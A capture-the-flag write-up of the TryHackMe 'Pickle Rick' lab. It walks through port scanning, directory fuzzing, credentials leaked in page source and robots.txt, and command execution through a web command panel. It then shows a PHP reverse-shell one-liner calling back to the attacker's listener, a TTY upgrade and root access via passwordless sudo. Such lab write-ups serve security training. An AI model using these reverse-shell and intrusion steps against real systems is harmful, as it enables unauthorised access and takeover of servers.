# TryHackMe - Pickle Rick

## Scenario
Rick has turned himself into a pickle again and can't change back. He needs Morty to log onto his computer and find the three secret ingredients needed to finish the pickle-reverse potion — but the password is unknown.

---

## 1. Reconnaissance

Started with an `nmap` full scan against the target:

```bash
nmap -A 10.48.176.236
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

The HTTP title was `Rick is sup4r cool` — a first hint that the box is Rick and Morty themed.

---

## 2. Web Enumeration

Browsing to `http://10.48.176.236` shows a "Help Morty!" page — Rick explains he's turned himself into a pickle and needs Morty to log in and find the three secret ingredients, but doesn't remember the password.

**Checked the page source (`view-source:`)** and found an HTML comment left behind by the developer:

```html
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
```

This gave the first credential piece — **username: `R1ckRul3s`**.

### Directory brute-forcing

Ran `gobuster` for directories:

```bash
gobuster dir -u http://10.48.176.236 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Found `/assets` (301), which only contained static site assets (`bootstrap.min.css`, `jquery.min.js`, `fail.gif`, `picklerick.gif`, `portal.jpg`, `rickandmorty.jpeg`) — nothing directly useful.

Followed up with `ffuf`, fuzzing common PHP/text/html/bak files:

```bash
ffuf -u http://10.49.151.43/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html,.bak
```

This turned up:
- `login.php` — 200
- `portal.php` — 302 (redirect, needs auth)
- `denied.php`
- `robots.txt` — 200

### robots.txt

```
Wubbalubbadubdub
```

Out of curiosity, tried this string as the password for `R1ckRul3s` on `login.php` — **and it worked**.

*(While waiting on that lead, also fuzzed the login form with `ffuf` against `rockyou.txt` using Burp to confirm the request format — `username=R1ckRul3s&password=FUZZ&sub=Login` — filtering out the "Invalid username or password" response. This wasn't ultimately needed once the robots.txt password succeeded, but confirmed the login mechanic.)*

---

## 3. Gaining Access — Command Panel

Logging in with `R1ckRul3s : Wubbalubbadubdub` redirects to `portal.php`, a "Command Panel" that executes arbitrary shell commands on the server.

Running `ls` returned:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Trying to `cat` the ingredient file directly triggered a filter:

> **Command disabled** to make it hard for future **PICKLEEEE RICCCKKKK**.

The page also left an HTML comment with a base64 string, which turned out to be encoded **multiple times over** — decoding it layer by layer eventually just unwraps to the plaintext `rabbit hole`, confirming it was a red herring/troll left by the box author rather than a real lead.

Command execution otherwise still worked for other commands (the filter was blocking specific ones), so enumeration continued:

```bash
cd /home && ls
```
```
rick
ubuntu
```

```bash
cd /home/rick && ls
```
```
'second ingredients'
```

(Note the filename has a space in it — needs quoting to `cat` later from a real shell.)

Used **Wappalyzer** in the browser to confirm the stack: Apache 2.4.41, PHP, Ubuntu, jQuery, Bootstrap — confirming PHP command execution was viable for a reverse shell.

---

## 4. Getting a Reverse Shell

Started a listener on the attack box:

```bash
nc -lvnp 4444
```

Sent a PHP reverse shell payload through the Command Panel:

```bash
php -r '$sock=fsockopen("192.168.128.15",4444);exec("sh <&3 >&3 2>&3");'
```

Caught the callback as `www-data`:

```
listening on [any] 4444 ...
connect to [192.168.128.15] from (UNKNOWN) [10.49.151.43] 39980
```

Upgraded to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Collecting the Ingredients

**Ingredient 1** — from `/var/www/html`:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```
```
mr. meeseek hair
```

`clue.txt` in the same directory hinted:
```
Look around the file system for the other ingredient.
```

**Ingredient 2** — from `/home/rick`:

```bash
cat "second ingredients"
```
```
****
```

---

## 6. Privilege Escalation

Checked `sudo` rights for `www-data`:

```bash
sudo su
```

No password was required — `www-data` had unrestricted `sudo` access, dropping straight into a **root** shell.

**Ingredient 3** — from `/root`:

```bash
cd root
ls
```
```
3rd.txt  
```

```bash
cat 3rd.txt
```

```
3rd ingredients: *****
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | `nmap -A` |
| Enumeration | `view-source`, `gobuster`, `ffuf` |
| Credential discovery | HTML comment (username) + `robots.txt` (password) |
| Initial access | Web login → Command Panel (`portal.php`) |
| Foothold | PHP reverse shell via command injection |
| Privesc | Passwordless `sudo su` |


**Root flag path:** `/root/3rd.txt`
